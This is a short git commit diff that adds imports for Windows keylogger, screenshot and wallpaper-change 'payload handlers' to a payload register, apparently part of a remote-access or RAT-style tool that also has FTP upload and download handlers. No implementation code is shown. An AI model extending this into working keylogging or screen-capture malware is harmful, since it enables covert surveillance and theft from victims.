a075412cf579bf9f62538249da276b07b94ed065
jack ogina <jackogina60@gmail.com>
2018-11-25 22:43:45 +0300

    updated payloads register

--- payloads/payload_register.py
+++ payloads/payload_register.py
@@ -1,7 +1,9 @@
 from payloads.change_directory_handler import ChangeDirectoryHandler
 from payloads.upload_payload_handler import FTPUploadPayloadHandler
 from payloads.download_payload_handler import FTPDownloadPayloadHandler
-
+from payloads.change_wallpaper_payload_handler import WindowsWallchangePayloadHandler
+from payloads.screenshot_payload_handler import WindowsScreenshotPayloadHandler
+from payloads.keylogger_payload_handler import WindowsFileKeyLogPayloadHandler
 
 payload_register={
     "cd":ChangeDirectoryHandler,
